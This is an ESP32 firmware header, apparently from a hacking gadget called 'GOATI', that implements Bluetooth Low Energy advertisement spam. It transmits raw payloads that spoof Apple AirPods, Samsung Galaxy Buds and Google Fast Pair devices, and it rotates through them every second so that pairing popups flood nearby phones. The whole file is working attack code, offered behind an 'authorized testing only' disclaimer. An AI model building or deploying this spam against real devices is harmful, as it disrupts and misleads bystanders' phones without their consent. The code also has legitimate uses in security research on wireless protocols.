/*
 * ─────────────────────────────────────────────────────────
 * GOATI : BLE spam (ESP32Marauder-style)
 *
 * Uses ESP-IDF raw HCI commands via esp_ble_gap_set_adv_data_raw()
 * so the FULL 32-byte Apple payload is transmitted intact.  This
 * bypasses the Arduino BLE library's 31-byte advertisement limit
 * and restores the iOS AirPods pairing popup.
 *
 * While the PRG button is held, the device rotates APPLE -> SAMSUNG
 * -> FASTPAIR every ~1 s.  Release to stop.
 *
 * INTENDED FOR AUTHORIZED SECURITY TESTING AND EDUCATIONAL USE
 * ONLY on devices you own or have explicit permission to test.
 *
 * Depends on: built-in Arduino-ESP32 BLE (registered gap callbacks
 *             via BLEDevice::init), ESP-IDF gap API.
 * ─────────────────────────────────────────────────────────
 */

#pragma once

#include <BLEDevice.h>
#include "esp_gap_ble_api.h"

// ─── Modes ──────────────────────────────────────────────────────────────
enum BleSpamMode : uint8_t {
  BLE_SPAM_OFF      = 0,
  BLE_SPAM_APPLE    = 1,
  BLE_SPAM_SAMSUNG  = 2,
  BLE_SPAM_FASTPAIR = 3,
  BLE_SPAM__COUNT
};

static const char* const BLE_SPAM_NAMES[] = {
  "OFF",
  "APPLE",
  "SAMSUNG",
  "FASTPAIR"
};

// ─── State ───────────────────────────────────────────────────────────────
static BleSpamMode g_ble_spam_mode = BLE_SPAM_OFF;
static uint32_t    g_ble_spam_pkt_count = 0;
static uint32_t    g_ble_spam_start_ms  = 0;
static uint32_t    g_ble_spam_last_rot  = 0;
static bool        g_ble_spam_running   = false;
static bool        g_ble_spam_inited    = false;

// ─── Raw AD payloads (32 bytes — fits through raw HCI) ───────────────────
// Apple Continuity Protocol — iOS AirPods pairing popup
static const uint8_t BLE_ADV_APPLE[] = {
  0x02, 0x01, 0x06,                               // flags
  0x1A, 0xFF, 0x4C, 0x00,                          // Apple mfg, length 26
  0x07, 0x19, 0x07,                               // Nearby Action
  0x0F, 0x20, 0x75, 0xAA, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12,
  0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00
};

// Samsung Galaxy Buds — 31 bytes
static const uint8_t BLE_ADV_SAMSUNG[] = {
  0x02, 0x01, 0x06,
  0x03, 0x03, 0xFE, 0x2C,
  0x14, 0xFF, 0x75, 0x00,
  0x42, 0x09, 0x81, 0x02, 0x14, 0x4D, 0x06, 0x59, 0x91, 0x23,
  0x82, 0x04, 0x09, 0xC0, 0x91, 0x55, 0x14, 0x09, 0xE4, 0x07
};

// Google Fast Pair — 14 bytes
static const uint8_t BLE_ADV_FASTPAIR[] = {
  0x02, 0x01, 0x06,
  0x03, 0x03, 0x2C, 0xFE,
  0x06, 0x16, 0x2C, 0xFE,
  0x04, 0x00, 0x00
};

// ─── Helpers ─────────────────────────────────────────────────────────────
static const uint8_t* ble_spam_payload(BleSpamMode mode, uint8_t* out_len) {
  switch (mode) {
    case BLE_SPAM_APPLE:    *out_len = sizeof(BLE_ADV_APPLE);    return BLE_ADV_APPLE;
    case BLE_SPAM_SAMSUNG:  *out_len = sizeof(BLE_ADV_SAMSUNG);  return BLE_ADV_SAMSUNG;
    case BLE_SPAM_FASTPAIR: *out_len = sizeof(BLE_ADV_FASTPAIR); return BLE_ADV_FASTPAIR;
    default: *out_len = 0; return nullptr;
  }
}

static void ble_spam_apply_raw(BleSpamMode mode) {
  uint8_t len = 0;
  const uint8_t* buf = ble_spam_payload(mode, &len);
  if (!buf || len == 0) return;
  // Use raw HCI so the full 32-byte Apple payload is preserved.
  // ESP-IDF 4.4: the API is esp_ble_gap_config_adv_data_raw() (returns ESP_OK
  // and triggers the GAP callback to actually push the data).
  esp_err_t err = esp_ble_gap_config_adv_data_raw((uint8_t*)buf, len);
  if (err != ESP_OK) {
    Serial.printf("[BLE Spam] raw adv config failed err=%d len=%u\r\n", err, (unsigned)len);
  }
}

static void ble_spam_start_adv() {
  esp_ble_adv_params_t params = {};
  params.adv_int_min       = 0x20;
  params.adv_int_max       = 0x40;
  params.adv_type          = ADV_TYPE_NONCONN_IND;
  params.own_addr_type     = BLE_ADDR_TYPE_RANDOM;
  params.peer_addr_type    = BLE_ADDR_TYPE_PUBLIC;
  memset(params.peer_addr, 0, 6);
  params.channel_map       = ADV_CHNL_ALL;
  params.adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY;
  esp_err_t err = esp_ble_gap_start_advertising(&params);
  if (err != ESP_OK) {
    Serial.printf("[BLE Spam] start_advertising err=%d\r\n", err);
  }
}

static void ble_spam_stop_adv() {
  esp_ble_gap_stop_advertising();
}

// ─── Public API ──────────────────────────────────────────────────────────
static void ble_spam_init() {
  // NOTE: BLEDevice::init() is called by badusb_init() with the correct
  // device name "GOATI-KB".  Calling it here first would lock the device
  // name to "GOATI" because BLEDevice::init() is idempotent (subsequent
  // calls are no-ops).  The BLE controller is already initialized by the
  // time this is called.
  if (g_ble_spam_inited) return;
  g_ble_spam_inited = true;
  Serial.println(F("[BLE Spam] init OK (uses badusb's BLE stack)"));
}

static void ble_spam_start_combined() {
  Serial.println(F("[BLE Spam] combined attack START"));
  ble_spam_init();
  g_ble_spam_mode      = BLE_SPAM_APPLE;
  g_ble_spam_pkt_count = 0;
  g_ble_spam_start_ms  = millis();
  g_ble_spam_last_rot  = millis();
  g_ble_spam_running   = true;

  ble_spam_apply_raw(BLE_SPAM_APPLE);
  ble_spam_start_adv();
}

static void ble_spam_stop() {
  if (!g_ble_spam_running) return;
  Serial.println(F("[BLE Spam] STOP"));
  ble_spam_stop_adv();
  g_ble_spam_running = false;
  g_ble_spam_mode    = BLE_SPAM_OFF;

  // The raw HCI advertising overrode the BLE Keyboard's.  Restore it so
  // "GOATI-KB" is discoverable again.  Reset address type to PUBLIC first
  // (BLE Spam switched to RANDOM), then re-start the BLEAdvertising instance
  // owned by the BLE Keyboard library.
  delay(100);
  // Reset to PUBLIC address: clear the random address so the public (factory)
  // MAC is used.  Setting all-zero bytes to the random address slot tells the
  // controller to fall back to the public address.
  uint8_t zero_addr[6] = {0};
  esp_ble_gap_set_rand_addr(zero_addr);
  delay(50);
  BLEAdvertising* pAdv = BLEDevice::getAdvertising();
  if (pAdv) {
    pAdv->start();
    Serial.println(F("[BadUSB] advertising restarted"));
  }
}

static void ble_spam_loop() {
  if (!g_ble_spam_running) return;
  g_ble_spam_pkt_count++;
  // Rotate to next flavor every 1 s
  if (millis() - g_ble_spam_last_rot > 1000) {
    g_ble_spam_last_rot = millis();
    uint8_t m = (uint8_t)g_ble_spam_mode + 1;
    if (m >= BLE_SPAM__COUNT) m = BLE_SPAM_APPLE;
    g_ble_spam_mode = (BleSpamMode)m;
    Serial.printf("[BLE Spam] -> %s\r\n", BLE_SPAM_NAMES[m]);
    ble_spam_stop_adv();
    ble_spam_apply_raw((BleSpamMode)m);
    ble_spam_start_adv();
  }
}

// Backwards-compat shims (kept so callers don't break)
static void ble_spam_cycle_mode() {
  g_ble_spam_mode = (BleSpamMode)(((uint8_t)g_ble_spam_mode + 1) % BLE_SPAM__COUNT);
  if (g_ble_spam_mode == BLE_SPAM_OFF) g_ble_spam_mode = BLE_SPAM_APPLE;
}

static void ble_spam_start(BleSpamMode mode) {
  ble_spam_start_combined();
  if (mode != BLE_SPAM_OFF && g_ble_spam_running) {
    g_ble_spam_mode = mode;
    ble_spam_stop_adv();
    ble_spam_apply_raw(mode);
    ble_spam_start_adv();
  }
}
